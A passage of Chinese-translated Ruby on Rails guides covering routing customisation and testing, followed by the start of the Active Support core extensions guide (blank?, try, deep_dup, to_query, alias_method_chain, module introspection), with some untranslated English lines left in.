除了使用字符串，例如 'posts#index'，把请求映射到 PostsController 的 index 动作上之外，还可使用 Rack 程序作为端点：
match '/application.js', to: Sprockets, via: :all

只要 Sprockets 能响应 call 方法，而且返回 [status, headers, body] 形式的结果，路由器就不知道这是个 Rack 程序还是动作。这里使用 via: :all 是正确的，因为我们想让 Rack 程序自行判断，处理所有 HTTP 方法。

其实 'posts#index' 的复杂形式是 PostsController.action(:index)，得到的也是个合法的 Rack 程序。
###  3.14 使用 root

使用 root 方法可以指定怎么处理 '/' 请求：
root to: 'pages#main'
root 'pages#main' # shortcut for the above

root 路由应该放在文件的顶部，因为这是最常用的路由，应该先匹配。

root 路由只处理映射到动作上的 GET 请求。

在命名空间和作用域中也可使用 root。例如：
namespace :admin do
  root to: "admin#index"
end
 
root to: "home#index"
###  3.15 Unicode 字符路由

路由中可直接使用 Unicode 字符。例如：
get 'こんにちは', to: 'welcome#index'

##  4 定制资源式路由

虽然 resources :posts 默认生成的路由和帮助方法都满足大多数需求，但有时还是想做些定制。Rails 允许对资源式帮助方法做几乎任何形式的定制。
###  4.1 指定使用的控制器

:controller 选项用来指定资源使用的控制器。例如：
resources :photos, controller: 'images'

能识别以 /photos 开头的请求，但交给 Images 控制器处理：
HTTP 方法 	路径 	控制器#动作 	具名帮助方法
GET 	/photos 	images#index 	photos_path
GET 	/photos/new 	images#new 	new_photo_path
POST 	/photos 	images#create 	photos_path
GET 	/photos/:id 	images#show 	photo_path(:id)
GET 	/photos/:id/edit 	images#edit 	edit_photo_path(:id)
PATCH/PUT 	/photos/:id 	images#update 	photo_path(:id)
DELETE 	/photos/:id 	images#destroy 	photo_path(:id)

要使用 photos_path、new_photo_path 等生成该资源的路径。

命名空间中的控制器可通过目录形式指定。例如：
resources :user_permissions, controller: 'admin/user_permissions'

这个路由会交给 Admin::UserPermissions 控制器处理。

只支持目录形式。如果使用 Ruby 常量形式，例如 controller: 'Admin::UserPermissions'，会导致路由报错。
###  4.2 指定约束

可以使用 :constraints选项指定 id 必须满足的格式。例如：
resources :photos, constraints: {id: /[A-Z][A-Z][0-9]+/}

这个路由声明限制参数 :id 必须匹配指定的正则表达式。因此，这个路由能匹配 /photos/RR27，不能匹配 /photos/1。

使用代码块形式可以把约束应用到多个路由上：
constraints(id: /[A-Z][A-Z][0-9]+/) do
  resources :photos
  resources :accounts
end

当然了，在资源式路由中也能使用非资源式路由中的高级约束。

默认情况下，在 :id 参数中不能使用点号，因为点号是格式化路由的分隔符。如果需要在 :id 中使用点号，可以添加一个约束条件。例如，id: /[^\/]+/ 可以接受除斜线之外的所有字符。
###  4.3 改写具名帮助方法

:as 选项可以改写常规的具名路由帮助方法。例如：
resources :photos, as: 'images'

能识别以 /photos 开头的请求，交给 PhotosController 处理，但使用 :as 选项的值命名帮助方法：
HTTP 方法 	路径 	控制器#动作 	具名帮助方法
GET 	/photos 	photos#index 	images_path
GET 	/photos/new 	photos#new 	new_image_path
POST 	/photos 	photos#create 	images_path
GET 	/photos/:id 	photos#show 	image_path(:id)
GET 	/photos/:id/edit 	photos#edit 	edit_image_path(:id)
PATCH/PUT 	/photos/:id 	photos#update 	image_path(:id)
DELETE 	/photos/:id 	photos#destroy 	image_path(:id)
###  4.4 改写 new 和 edit 片段

:path_names 选项可以改写路径中自动生成的 "new" 和 "edit" 片段：
resources :photos, path_names: { new: 'make', edit: 'change' }

这样设置后，路由就能识别如下的路径：
/photos/make
/photos/1/change

这个选项并不能改变实际处理请求的动作名。上述两个路径还是交给 new 和 edit 动作处理。

如果想按照这种方式修改所有路由，可以使用作用域。 T> T> T>ruby TIP: scope path_names: { new: 'make' } do TIP: # rest of your routes TIP: end TIP:
###  4.5 为具名路由帮助方法加上前缀

使用 :as 选项可在 Rails 为路由生成的路由帮助方法前加上前缀。这个选项可以避免作用域内外产生命名冲突。例如：
scope 'admin' do
  resources :photos, as: 'admin_photos'
end
 
resources :photos

这段路由会生成 admin_photos_path 和 new_admin_photo_path 等帮助方法。

要想为多个路由添加前缀，可以在 scope 方法中设置 :as 选项：
scope 'admin', as: 'admin' do
  resources :photos, :accounts
end
 
resources :photos, :accounts

这段路由会生成 admin_photos_path 和 admin_accounts_path 等帮助方法，分别映射到 /admin/photos 和 /admin/accounts 上。

namespace 作用域会自动添加 :as 以及 :module 和 :path 前缀。

路由帮助方法的前缀还可使用具名参数：
scope ':username' do
  resources :posts
end

这段路由能识别 /bob/posts/1 这种请求，在控制器、帮助方法和视图中可使用 params[:username] 获取 username 的值。
###  4.6 限制生成的路由

默认情况下，Rails 会为每个 REST 路由生成七个默认动作（index，show，new，create，edit，update 和 destroy）对应的路由。你可以使用 :only 和 :except 选项调整这种行为。:only 选项告知 Rails，只生成指定的路由：
resources :photos, only: [:index, :show]

此时，向 /photos 能发起 GET 请求，但不能发起 POST 请求（正常情况下由 create 动作处理）。

:except 选项指定不用生成的路由：
resources :photos, except: :destroy

此时，Rails 会生成除 destroy（向 /photos/:id 发起的 DELETE 请求）之外的所有常规路由。

如果程序中有很多 REST 路由，使用 :only 和 :except 指定只生成所需的路由，可以节省内存，加速路由处理过程。
###  4.7 翻译路径

使用 scope 时，可以改写资源生成的路径名：
scope(path_names: { new: 'neu', edit: 'bearbeiten' }) do
  resources :categories, path: 'kategorien'
end

Rails 为 CategoriesController 生成的路由如下：
HTTP 方法 	路径 	控制器#动作 	具名帮助方法
GET 	/kategorien 	categories#index 	categories_path
GET 	/kategorien/neu 	categories#new 	new_category_path
POST 	/kategorien 	categories#create 	categories_path
GET 	/kategorien/:id 	categories#show 	category_path(:id)
GET 	/kategorien/:id/bearbeiten 	categories#edit 	edit_category_path(:id)
PATCH/PUT 	/kategorien/:id 	categories#update 	category_path(:id)
DELETE 	/kategorien/:id 	categories#destroy 	category_path(:id)
###  4.8 改写单数形式

如果想定义资源的单数形式，需要在 Inflector 中添加额外的规则：
ActiveSupport::Inflector.inflections do |inflect|
  inflect.irregular 'tooth', 'teeth'
end
###  4.9 在嵌套资源中使用 :as 选项

:as 选项可以改自动生成的嵌套路由帮助方法名。例如：
resources :magazines do
  resources :ads, as: 'periodical_ads'
end

这段路由会生成 magazine_periodical_ads_url 和 edit_magazine_periodical_ad_path 等帮助方法。

##  5 路由审查和测试

Rails 提供有路由审查和测试功能。
###  5.1 列出现有路由

要想查看程序完整的路由列表，可以在开发环境中使用浏览器打开 http://localhost:3000/rails/info/routes。也可以在终端执行 rake routes 任务查看，结果是一样的。

这两种方法都能列出所有路由，和在 routes.rb 中的定义顺序一致。你会看到每个路由的以下信息：

    路由名（如果有的话）
    使用的 HTTP 方法（如果不响应所有方法）
    匹配的 URL 模式
    路由的参数

例如，下面是执行 rake routes 命令后看到的一个 REST 路由片段：
    users GET    /users(.:format)          users#index
          POST   /users(.:format)          users#create
 new_user GET    /users/new(.:format)      users#new
edit_user GET    /users/:id/edit(.:format) users#edit

可以使用环境变量 CONTROLLER 限制只显示映射到该控制器上的路由：
$ CONTROLLER=users rake routes

拉宽终端窗口直至没断行，这时看到的 rake routes 输出更完整。
###  5.2 测试路由

和程序的其他部分一样，路由也要测试。Rails 内建了三个断言，可以简化测试：

    assert_generates
    assert_recognizes
    assert_routing

####  5.2.1 assert_generates 断言

assert_generates 检测提供的选项是否能生成默认路由或自定义路由。例如：
assert_generates '/photos/1', { controller: 'photos', action: 'show', id: '1' }
assert_generates '/about', controller: 'pages', action: 'about'
####  5.2.2 assert_recognizes 断言

assert_recognizes 是 assert_generates 的反测试，检测提供的路径是否能陪识别并交由特定的控制器处理。例如：
assert_recognizes({ controller: 'photos', action: 'show', id: '1' }, '/photos/1')

可以使用 :method 参数指定使用的 HTTP 方法：
assert_recognizes({ controller: 'photos', action: 'create' }, { path: 'photos', method: :post })
####  5.2.3 assert_routing 断言

assert_routing 做双向测试：检测路径是否能生成选项，以及选项能否生成路径。因此，综合了 assert_generates 和 assert_recognizes 两个断言。
assert_routing({ path: 'photos', method: :post }, { controller: 'photos', action: 'create' })

##  反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Active Support 核心扩展

Active Support 作为 Ruby on Rails 的一个组件，可以用来添加 Ruby 语言扩展、工具集以及其他这类事物。

它从语言的层面上进行了强化，既可起效于一般 Rails 程序开发，又能增强 Ruby on Rails 框架自身。

读完本文，你将学到：

    核心扩展是什么。
    如何加载全部扩展。
    如何恰如其分的选出你需要的扩展。
    Active Support 都提供了哪些功能。

Chapters

    如何加载核心扩展
        单独的 Active Support
        Ruby on Rails 程序里的 Active Support
    所有对象都可用的扩展
        blank? and present?
        presence
        duplicable?
        deep_dup
        try
        class_eval(*args, &block)
        acts_like?(duck)
        to_param
        to_query
        with_options
        JSON 支持
        实例变量
        Silencing Warnings, Streams, 和 Exceptions
        in?
    对Module的扩展
        alias_method_chain
        属性
        Parents
        常量
        Reachable
        Anonymous
        Method Delegation
        Redefining Methods
    对Class 的扩展
        Class Attributes
        Subclasses & Descendants
    对String的扩展
        Output Safety
        remove
        squish
        truncate
        inquiry
        starts_with? and ends_with?
        strip_heredoc
        indent
        Access
        Inflections
        Conversions
    对Numeric的扩展
        Bytes
        Time
        Formatting
    对Integer的扩展
        multiple_of?
        ordinal
        ordinalize
    对BigDecimal的扩展
        to_s
        to_formatted_s
    对Enumerable的扩展
        sum
        index_by
        many?
        exclude?
    对Array的扩展
        Accessing
        Adding Elements
        Options Extraction
        Conversions
        Wrapping
        Duplicating
        Grouping
    对Hash的扩展
        Conversions
        Merging
        Deep duplicating
        Working with Keys
        Slicing
        Extracting
        Indifferent Access
        Compacting
    对Regexp的扩展
        multiline?
    对 Range的扩展
        to_s
        include?
        overlaps?
    对Proc的扩展
        bind
    对Date的扩展
        Calculations
        Conversions
    对DateTime的扩展
        Calculations
    对Time的扩展
        Calculations
        Time Constructors
    对File的扩展
        atomic_write
    对 Marshal的扩展
        load
    对Logger的扩展
        around_[level]
        silence
        datetime_format=
    对NameError的扩展
    对LoadError的扩展

##  1 如何加载核心扩展
###  1.1 单独的 Active Support

为了使初始空间尽可能干净，默认情况下 Active Support 什么都不加载。它被拆分成许多小组建，这样一来你便可以只加载自己需要的那部分，同时它也提供了一系列便捷入口使你很容易加载相关的扩展，甚至把全部扩展都加载进来。

因而，像下面这样只简单用一个 require：
require 'active_support'

对象会连blank?都没法响应。让我们来看下该如何加载它的定义。
####  1.1.1 选出合适的定义

找到blank?最轻便的方法就是直接找出定义它的那个文件。

对于每一个定义在核心扩展里的方法，本指南都会注明此方法定义于何处。例如这里提到的blank?，会像这样注明：

定义于 active_support/core_ext/object/blank.rb。

这意味着你可以像下面这样 require 它：
require 'active_support'
require 'active_support/core_ext/object/blank'

Active Support 经过了严格的修订，确保选定的文件只会加载必要的依赖，若没有则不加载。
####  1.1.2 加载一组核心扩展

接下来加载Object下的全部扩展。一般来说，想加载SomeClass下的全部可用扩展，只需加载active_support/core_ext/some_class即可。

所以，若要加载Object下的全部扩展（包含blank?）：
require 'active_support'
require 'active_support/core_ext/object'
####  1.1.3 加载全部核心扩展

你可能更倾向于加载全部核心扩展，有一个文件能办到：
require 'active_support'
require 'active_support/core_ext'
####  1.1.4 加载全部 Active Support

最后，如果你想要 Active Support 的全部内容，只需：
require 'active_support/all'

这样做并不会把整个 Active Support 预加载到内存里，鉴于autoload的机制，其只有在真正用到时才会加载。

###  1.2 Ruby on Rails 程序里的 Active Support

除非把config.active_support.bare设置为 true, 否则 Ruby on Rails 的程序会加载全部的 Active Support。如此一来，程序只会加载框架为自身需要挑选出来的扩展，同时也可像上文所示，可以从任何级别加载特定扩展。

##  2 所有对象都可用的扩展
###  2.1 blank? and present?

以下各值在 Rails 程序里都看作 blank。

    nil 和 false，

    只包含空白的字符串(参照下文注释),

    空的数组和散列表

    任何其他能响应 empty? 方法且为空的对象。

判断字符串是否为空依据了 Unicode-aware 字符类 [:space:]，所以例如 U+2029（段落分隔符）这种会被当作空白。

注意这里没有提到数字。通常来说，0和0.0都不是blank。

例如，ActionController::HttpAuthentication::Token::ControllerMethods里的一个方法使用了blank?来检验 token 是否存在。
def authenticate(controller, &login_procedure)
  token, options = token_and_options(controller.request)
  unless token.blank?
    login_procedure.call(token, options)
  end
end

present? 方法等同于 !blank?， 下面的例子出自ActionDispatch::Http::Cache::Response：
def set_conditional_cache_control!
  return if self["Cache-Control"].present?
  ...
end

定义于 active_support/core_ext/object/blank.rb.
###  2.2 presence

presence方法如果满足present?则返回调用者，否则返回nil。它适用于下面这种情况：
host = config[:host].presence || 'localhost'

定义于 active_support/core_ext/object/blank.rb.
###  2.3 duplicable?

A few fundamental objects in Ruby are singletons. For example, in the whole life of a program the integer 1 refers always to the same instance: Ruby 里有些基本对象是单例的。比如，在整个程序的生命周期里，数字1永远指向同一个实例。
1.object_id                 # => 3
Math.cos(0).to_i.object_id  # => 3

因而，这些对象永远没法用dup或clone复制。
true.dup  # => TypeError: can't dup TrueClass

有些数字虽然不是单例的，但也同样无法复制：
0.0.clone        # => allocator undefined for Float
(2**1024).clone  # => allocator undefined for Bignum

Active Support 提供了 duplicable? 方法来判断一个对象是否能够被复制:
"foo".duplicable? # => true
"".duplicable?    # => true
0.0.duplicable?   # => false
false.duplicable? # => false

根据定义，所有的对象的duplicated?的，除了：nil、false、 true、 符号、 数字、 类和模块。

任何的类都可以通过移除dup和clone方法，或者在其中抛出异常，来禁用其复制功能。虽然duplicable?方法是基于上面的硬编码列表，但是它比用rescue快的多。确保仅在你的情况合乎上面的硬编码列表时候再使用它。

定义于 active_support/core_ext/object/duplicable.rb.
###  2.4 deep_dup

`deep_dup`方法返回一个对象的深度拷贝。一般来说，当你dup一个包含其他对象的对象时，Ruby 并不会把被包含的对象一同dup，它只会创建一个对象的浅表拷贝。假如你有一个字符串数组，如下例所示：
array     = ['string']
duplicate = array.dup
 
duplicate.push 'another-string'
 
# 对象被复制了，所以只有 duplicate 的数组元素有所增加
array     # => ['string']
duplicate # => ['string', 'another-string']
 
duplicate.first.gsub!('string', 'foo')
 
# 第一个数组元素并未被复制，所以两个数组都发生了变化
array     # => ['foo']
duplicate # => ['foo', 'another-string']

如你所见，对Array实例进行复制后，我们得到了另一个对象，因而我们修改它时，原始对象并未跟着有所变化。不过对数组元素而言，情况却有所不同。因为dup不会创建深度拷贝，所以数组里的字符串依然是同一个对象。

如果你需要一个对象的深度拷贝，就应该使用`deep_dup`。我们再来看下面这个例子：
array     = ['string']
duplicate = array.deep_dup
 
duplicate.first.gsub!('string', 'foo')
 
array     # => ['string']
duplicate # => ['foo']

如果一个对象是不可复制的，deep_dup会返回其自身：
number = 1
duplicate = number.deep_dup
number.object_id == duplicate.object_id   # => true

定义于 active_support/core_ext/object/deep_dup.rb.
###  2.5 try

如果你想在一个对象不为nil时，对其调用一个方法，最简单的办法就是使用条件从句，但这么做也会使代码变得乱七八糟。另一个选择就是使用try。try就好比Object#send，只不过如果接收者为nil，那么返回值也会是nil。

看下这个例子：
# 不使用 try
unless @number.nil?
  @number.next
end
 
# 使用 try
@number.try(:next)

接下来的这个例子，代码出自ActiveRecord::ConnectionAdapters::AbstractAdapter，这里的@logger有可能为nil。能够看到，代码里使用了try来避免不必要的检查。
def log_info(sql, name, ms)
  if @logger.try(:debug?)
    name = '%s (%.1fms)' % [name || 'SQL', ms]
    @logger.debug(format_log_entry(name, sql.squeeze(' ')))
  end
end

调用try时也可以不传参数而是用代码快，其中的代码只有在对象不为nil时才会执行：
@person.try { |p| "#{p.first_name} #{p.last_name}" }

定义于 active_support/core_ext/object/try.rb.
###  2.6 class_eval(*args, &block)

You can evaluate code in the context of any object's singleton class using class_eval: 使用class_eval，可以使代码在对象的单件类的上下文里执行：
class Proc
  def bind(object)
    block, time = self, Time.current
    object.class_eval do
      method_name = "__bind_#{time.to_i}_#{time.usec}"
      define_method(method_name, &block)
      method = instance_method(method_name)
      remove_method(method_name)
      method
    end.bind(object)
  end
end

定义于 active_support/core_ext/kernel/singleton_class.rb.
###  2.7 acts_like?(duck)

acts_like?方法可以用来判断某个类与另一个类是否有相同的行为，它基于一个简单的惯例：这个类是否提供了与String相同的接口：
def acts_like_string?
end

上述代码只是一个标识，它的方法体或返回值都是不相关的。之后，就可以像下述代码那样判断其代码是否为“鸭子类型安全”的代码了：
some_klass.acts_like?(:string)

Rails 里的许多类，例如Date和Time，都遵循上述约定。

定义于 active_support/core_ext/object/acts_like.rb.
###  2.8 to_param

所有 Rails 对象都可以响应to_param方法，它会把对象的值转换为查询字符串，或者 URL 片段，并返回该值。

默认情况下，to_param仅仅调用了to_s：
7.to_param # => "7"

不要对to_param方法的返回值进行转义：
"Tom & Jerry".to_param # => "Tom & Jerry"

Rails 里的许多类重写了这个方法。

例如nil、true和false会返回其自身。Array#to_param会对数组元素调用to_param并把结果用"/"连接成字符串：
[0, true, String].to_param # => "0/true/String"

需要注意的是， Rails 的路由系统会在模型上调用to_param并把结果作为:id占位符。ActiveRecord::Base#to_param会返回模型的id，但是你也可以在自己模型里重新定义它。例如：
class User
  def to_param
    "#{id}-#{name.parameterize}"
  end
end

会得到：
user_path(@user) # => "/users/357-john-smith"

控制器里需要注意被重定义过的to_param，因为一个类似上述的请求里，会把"357-john-smith"当作params[:id]的值。

定义于 active_support/core_ext/object/to_param.rb.
###  2.9 to_query

除了散列表之外，给定一个未转义的key，这个方法就会基于这个键和to_param的返回值，构造出一个新的查询字符串。例如：
class User
  def to_param
    "#{id}-#{name.parameterize}"
  end
end

会得到：
current_user.to_query('user') # => "user=357-john-smith"

无论对于键还是值，本方法都会根据需要进行转义：
account.to_query('company[name]')
# => "company%5Bname%5D=Johnson+%26+Johnson"

所以它的输出已经完全适合于用作查询字符串。

对于数组，会对其中每个元素以_key_[]为键执行to_query方法，并把结果用"&"连接为字符串：
[3.4, -45.6].to_query('sample')
# => "sample%5B%5D=3.4&sample%5B%5D=-45.6"

哈系表也可以响应to_query方法但是用法有所不同。如果调用时没传参数，会先生成一系列排过序的键值对并在值上调用to_query(键)。然后把所得结果用"&"连接为字符串：
{c: 3, b: 2, a: 1}.to_query # => "a=1&b=2&c=3"

Hash#to_query方法也可接受一个可选的命名空间作为键：
{id: 89, name: "John Smith"}.to_query('user')
# => "user%5Bid%5D=89&user%5Bname%5D=John+Smith"

定义于 active_support/core_ext/object/to_query.rb.

###  2.10 with_options

with_options方法可以为一组方法调用提取出共有的选项。

假定有一个默认的散列表选项，with_options方法会引入一个代理对象到代码块。在代码块内部，代理对象上的方法调用，会连同被混入的选项一起，被转发至原方法接收者。例如，若要去除下述代码的重复内容：
class Account < ActiveRecord::Base
  has_many :customers, dependent: :destroy
  has_many :products,  dependent: :destroy
  has_many :invoices,  dependent: :destroy
  has_many :expenses,  dependent: :destroy
end

可按此法书写：
class Account < ActiveRecord::Base
  with_options dependent: :destroy do |assoc|
    assoc.has_many :customers
    assoc.has_many :products
    assoc.has_many :invoices
    assoc.has_many :expenses
  end
end
TODO: clear this after totally understanding what these statnances means...

That idiom may convey grouping to the reader as well. For example, say you want to send a newsletter whose language depends on the user. Somewhere in the mailer you could group locale-dependent bits like this: 上述写法也可用于对读取器进行分组。例如，假设你要发一份新闻通讯，通讯所用语言取决于用户。便可以利用如下例所示代码，对用户按照地区依赖进行分组：
I18n.with_options locale: user.locale, scope: "newsletter" do |i18n|
  subject i18n.t :subject
  body    i18n.t :body, user_name: user.name
end

由于with_options会把方法调用转发给其自身的接收者，所以可以进行嵌套。每层嵌套都会把继承来的默认值混入到自身的默认值里。

定义于 active_support/core_ext/object/with_options.rb.

###  2.11 JSON 支持

相较于 json gem 为 Ruby 对象提供的to_json方法，Active Support 给出了一个更好的实现。因为有许多类，诸如Hash、OrderedHash和Process::Status，都需要做特殊处理才能到适合的 JSON 替换。

定义于 active_support/core_ext/object/json.rb.

###  2.12 实例变量

Active Support 提供了若干方法以简化对实例变量的访问。
####  2.12.1 instance_values

instance_values方法返回一个散列表，其中会把实例变量名去掉"@"作为键，把相应的实例变量值作为值。键全部是字符串：
class C
  def initialize(x, y)
    @x, @y = x, y
  end
end
 
C.new(0, 1).instance_values # => {"x" => 0, "y" => 1}

定义于 active_support/core_ext/object/instance_variables.rb.

####  2.12.2 instance_variable_names

instance_variable_names方法返回一个数组。数组中所有的实例变量名都带有"@"标志。
class C
  def initialize(x, y)
    @x, @y = x, y
  end
end
 
C.new(0, 1).instance_variable_names # => ["@x", "@y"]

定义于 active_support/core_ext/object/instance_variables.rb.

###  2.13 Silencing Warnings, Streams, 和 Exceptions

silence_warnings和enable_warnings方法都可以在其代码块里改变$VERBOSE的值，并在之后把值重置：
silence_warnings { Object.const_set "RAILS_DEFAULT_LOGGER", logger }

You can silence any stream while a block runs with silence_stream: 在通过silence_stream执行的代码块里，可以使任意流安静的运行：
silence_stream(STDOUT) do
  # 这里的代码不会输出到 STDOUT
end

quietly方法可以使 STDOUT 和 STDERR 保持安静，即便在子进程里也如此：
quietly { system 'bundle install' }

例如，railties 测试组件会用到上述方法，来阻止普通消息与进度状态混到一起。

也可以用suppress方法来使异常保持安静。方法接收任意数量的异常类。如果代码块的代码执行时报出异常，并且该异常kind_of?满足任一参数，suppress便会将异其捕获并安静的返回。否则会重新抛出该异常：
# If the user is locked the increment is lost, no big deal.
suppress(ActiveRecord::StaleObjectError) do
  current_user.increment! :visits
end

定义于 active_support/core_ext/kernel/reporting.rb.

###  2.14 in?

判断式in?用于测试一个对象是否被包含在另一个对象里。当传入的参数无法响应include?时，会抛出ArgumentError异常。

使用in?的例子：
1.in?([1,2])        # => true
"lo".in?("hello")   # => true
25.in?(30..50)      # => false
1.in?(1)            # => ArgumentError

定义于 active_support/core_ext/object/inclusion.rb.
##  3 对Module的扩展
###  3.1 alias_method_chain

使用纯 Ruby 可以用方法环绕其他的方法，这种做法被称为环绕别名。

例如，我们假设在功能测试里你希望参数都是字符串，就如同真实的请求中那样，但是同时你也希望对于数字和其他类型的值能够很方便的赋值。为了做到这点，你可以把test/test_helper.rb里的ActionController::TestCase#process方法像下面这样环绕：
ActionController::TestCase.class_eval do
  # save a reference to the original process method
  alias_method :original_process, :process
 
  # now redefine process and delegate to original_process
  def process(action, params=nil, session=nil, flash=nil, http_method='GET')
    params = Hash[*params.map {|k, v| [k, v.to_s]}.flatten]
    original_process(action, params, session, flash, http_method)
  end
end

get、post等最终会通过此方法执行。

这么做有一定风险，:original_process有可能已经被占用了。为了避免方法名发生碰撞，通常会添加标签来表明这是个关于什么的别名：
ActionController::TestCase.class_eval do
  def process_with_stringified_params(...)
    params = Hash[*params.map {|k, v| [k, v.to_s]}.flatten]
    process_without_stringified_params(action, params, session, flash, http_method)
  end
  alias_method :process_without_stringified_params, :process
  alias_method :process, :process_with_stringified_params
end

alias_method_chain为上述技巧提供了一个便捷之法：
ActionController::TestCase.class_eval do
  def process_with_stringified_params(...)
    params = Hash[*params.map {|k, v| [k, v.to_s]}.flatten]
    process_without_stringified_params(action, params, session, flash, http_method)
  end
  alias_method_chain :process, :stringified_params
end

Rails 源代码中随处可见alias_method_chain。例如ActiveRecord::Base#save里，就通过这种方式对方法进行环绕，从 validations 下一个专门的模块里为其增加了验证。

定义于 active_support/core_ext/module/aliasing.rb.
###  3.2 属性
####  3.2.1 alias_attribute

模型属性包含读取器、写入器和判断式。只需添加一行代码，就可以为模型属性添加一个包含以上三个方法的别名。与其他别名方法一样，新名称充当第一个参数，原有名称是第二个参数（为了方便记忆，可以类比下赋值时的书写顺序）。
class User < ActiveRecord::Base
  # You can refer to the email column as "login".
  # This can be meaningful for authentication code.
  alias_attribute :login, :email
end

定义于 active_support/core_ext/module/aliasing.rb.
####  3.2.2 内部属性

当你在一个被继承的类里定义一条属性时，属性名称有可能会发生碰撞。这一点对许多库而言尤为重要。

Active Support 定义了attr_internal_reader、attr_internal_writer和attr_internal_accessor这些类宏。它们的作用与 Ruby 内建的attr_*相当，只不过实例变量名多了下划线以避免碰撞。

类宏attr_internal与attr_internal_accessor是同义：
# library
class ThirdPartyLibrary::Crawler
  attr_internal :log_level
end
 
# client code
class MyCrawler < ThirdPartyLibrary::Crawler
  attr_accessor :log_level
end

上述例子里的情况可能是，:log_level并不属于库的公共接口，而是只用于开发。而在客户代码里，由于不知道可能出现的冲突，便在子类里又定义了:log_level。多亏了attr_internal才没有出项碰撞。

默认情况下，内部实例变量名以下划线开头，如上例中即为@_log_level。不过这点可以通过Module.attr_internal_naming_format进行配置，你可以传入任何sprintf这一类的格式化字符串，并在开头加上@，同时还要加上%s表示变量名称的位置。默认值为"@_%s"。

Rails 在若干地方使用了内部属性，比如在视图层：
module ActionView
  class Base
    attr_internal :captures
    attr_internal :request, :layout
    attr_internal :controller, :template
  end
end

定义于 active_support/core_ext/module/attr_internal.rb.
####  3.2.3 Module Attributes

类宏mattr_reader、mattr_writer和mattr_accessor与为类定义的cattr_*是相同的。实际上，cattr_*系列的类宏只不过是mattr_*这些类宏的别名。详见Class Attributes。

例如，依赖性机制就用到了它们：
module ActiveSupport
  module Dependencies
    mattr_accessor :warnings_on_first_load
    mattr_accessor :history
    mattr_accessor :loaded
    mattr_accessor :mechanism
    mattr_accessor :load_paths
    mattr_accessor :load_once_paths
    mattr_accessor :autoloaded_constants
    mattr_accessor :explicitly_unloadable_constants
    mattr_accessor :logger
    mattr_accessor :log_activity
    mattr_accessor :constant_watch_stack
    mattr_accessor :constant_watch_stack_mutex
  end
end

定义于 active_support/core_ext/module/attribute_accessors.rb.

###  3.3 Parents
####  3.3.1 parent

对一个嵌套的模块调用parent方法，会返回其相应的常量：
module X
  module Y
    module Z
    end
  end
end
M = X::Y::Z
 
X::Y::Z.parent # => X::Y
M.parent       # => X::Y

如果这个模块是匿名的或者属于顶级作用域， parent会返回Object。

若有上述情况，则parent_name会返回nil。

定义于 active_support/core_ext/module/introspection.rb.
####  3.3.2 parent_name

对一个嵌套的模块调用parent_name方法，会返回其相应常量的完全限定名：
module X
  module Y
    module Z
    end
  end
end
M = X::Y::Z
 
X::Y::Z.parent_name # => "X::Y"
M.parent_name       # => "X::Y"

定义在顶级作用域里的模块或匿名的模块，parent_name会返回nil。

若有上述情况，则parent返回Object。

定义于 active_support/core_ext/module/introspection.rb.
####  3.3.3 parents

parents方法会对接收者调用parent，并向上追溯直至Object。之后所得结果链按由低到高顺序组成一个数组被返回。
module X
  module Y
    module Z
    end
  end
end
M = X::Y::Z
 
X::Y::Z.parents # => [X::Y, X, Object]
M.parents       # => [X::Y, X, Object]

定义于 active_support/core_ext/module/introspection.rb.

###  3.4 常量

defined in the receiver module: local_constants                                                                            该方法返回在接收者模块中定义的常量。
module X
  X1 = 1
  X2 = 2
  module Y
    Y1 = :y1
    X1 = :overrides_X1_above
  end
end
 
X.local_constants    # => [:X1, :X2, :Y]
X::Y.local_constants # => [:Y1, :X1]

常量名会作为符号被返回。

定义于 active_support/core_ext/module/introspection.rb.
####  3.4.1 限定常量名

标准方法const_defined?、const_get和const_set接受裸常量名。
Active Support 扩展了这些API使其可以接受相对限定常量名。

新的方法名是qualified_const_defined?，qualified_const_get和qualified_const_set。 它们的参数被假定为相对于其接收者的限定常量名：
Object.qualified_const_defined?("Math::PI")       # => true
Object.qualified_const_get("Math::PI")            # => 3.141592653589793
Object.qualified_const_set("Math::Phi", 1.618034) # => 1.618034

参数可以使用裸常量名：
Math.qualified_const_get("E") # => 2.718281828459045

These methods are analogous to their built-in counterparts. In particular, qualified_constant_defined? accepts an optional second argument to be able to say whether you want the predicate to look in the ancestors. This flag is taken into account for each constant in the expression while walking down the path.                                                                                     这些方法与其内建的对应方法很类似。尤为值得一提的是，qualified_constant_defined?接收一个可选的第二参数，以此来标明你是否要在祖先链中进行查找。

例如，假定：
module M
  X = 1
end
 
module N
  class C
    include M
  end
end

qualified_const_defined? 会这样执行：
N.qualified_const_defined?("C::X", false) # => false
N.qualified_const_defined?("C::X", true)  # => true
N.qualified_const_defined?("C::X")        # => true

As the last example implies, the second argument defaults to true, as in const_defined?.

For coherence with the built-in methods only relative paths are accepted. Absolute qualified constant names like ::Math::PI raise NameError.

定义于 active_support/core_ext/module/qualified_const.rb.
###  3.5 Reachable  可达性

A named module is reachable if it is stored in its corresponding constant. It means you can reach the module object via the constant.     如果一个已命名模块存储在相应的常量上，则该模块是可达的。这意味着你可以通过常量来reach这个模块。

That is what ordinarily happens, if a module is called "M", the M constant exists and holds it:           一般都会如此，如果一个模板名为M，则M常数存在并存储该模块。
module M
end
 
M.reachable? # => true

But since constants and modules are indeed kind of decoupled, module objects can become unreachable:   如果一旦常量和模块是一类decopled的，则模块对象会变得不可reach。
module M
end
 
orphan = Object.send(:remove_const, :M)
 
# The module object is orphan now but it still has a name. # 模块对象现在已经“成了孤儿”，尽管它还有一个名称。
orphan.name # => "M"
 
# You cannot reach it via the constant M because it does not even exist. # 因为它不再存在，你再也不能通过常量M来reach它了。
orphan.reachable? # => false
 
# Let's define a module called "M" again. # 现在再定义一个叫M的模块
module M
end
 
# The constant M exists now again, and it stores a module
# object called "M", but it is a new instance.
# M常量有活过来了，它存储着一个叫M的模块，但这是一个新的实例了。
orphan.reachable? # => false

定义于 active_support/core_ext/module/reachable.rb.
###  3.6 Anonymous   匿名模块

